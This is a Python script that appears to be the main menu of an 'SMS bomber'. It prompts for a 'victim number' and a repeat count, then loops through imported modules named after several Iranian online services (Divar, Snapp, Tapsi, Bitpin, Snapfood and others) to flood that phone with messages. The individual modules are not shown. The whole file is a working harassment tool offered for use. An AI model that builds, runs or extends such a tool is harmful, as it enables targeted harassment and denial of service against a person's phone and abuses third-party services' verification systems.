import requests
from time import sleep
from colorama import Fore as color  
from modules import telewebion ,divarbomber, snapbomber, tapsibomber, hmrahone, bitpin, snapfood, carlanser, jabvison
from menu import menu
import sys, os

bold = '\033[1m'
end = '\033[0m'
while True:

    try:
        os.system('cls')
        menu.banner(); menu.menu_respaws()
        user_input = input(color.WHITE+"Enter Your Choice => ")
        if (user_input == '1'):
            os.system('cls')
            menu.banner()
            print(color.RED+"[*] Enter the number without -[0,98].")
            try:
                number = input(color.LIGHTRED_EX+"[+] Enter the victim number :")
            except:
                print(color.LIGHTBLUE_EX+"[*] "+"Please Enter The Phone Number....")
                sleep(2)
                sys.exit()
            try:
                user_input_loop = int(input(color.LIGHTCYAN_EX+"[+] How many times you want to send messages? => "))
            except:
                print(color.RED+"Enter number....")
                sleep(2)
                sys.exit()
            try:
                print("""{0}COUNT \t\t {1}Time """.format(bold,bold))
                sms = 1
                for i in range(user_input_loop):
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');divarbomber.divar_bomber(number)
                    sms += 1
                    sleep(2)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');snapbomber.snap_bomber(number)
                    sms += 1
                    sleep(2)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');tapsibomber.divar_bomber(number)
                    sms += 1
                    sleep(2)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');telewebion.namava_bomber(number)
                    sms += 1
                    sleep(2)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');hmrahone.divar_bomber(number)
                    sms += 1
                    sleep(2)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');bitpin.divar_bomber(number)
                    sms += 1
                    sleep(2)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');tapsibomber.divar_bomber(number)
                    sms += 1
                    sleep(2)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');snapfood.divar_bomber(number)
                    sms += 1
                    sleep(2)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');carlanser.divar_bomber(number)
                    sms += 1
                    sleep(2)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');jabvison.divar_bomber(number)
                    sms += 1
                    sleep(2)
                    
                print(color.LIGHTYELLOW_EX+end+"[+] Done...")
                sleep(5)
            except:
                print(color.RED+"[-] Something bad happend....")
                sleep(2)
                raise
                sys.exit()
                

        elif (user_input == '0'):
            print(color.WHITE+"[*] The end")
            sleep(2)
            sys.exit()
        else:
            print(color.RED+"Something went Wrong...")
            sleep(2)
            sys.exit()
    except:
        print(color.RED+"[-] Something Went Wrong...")
        sleep(2)
        raise
        sys.exit()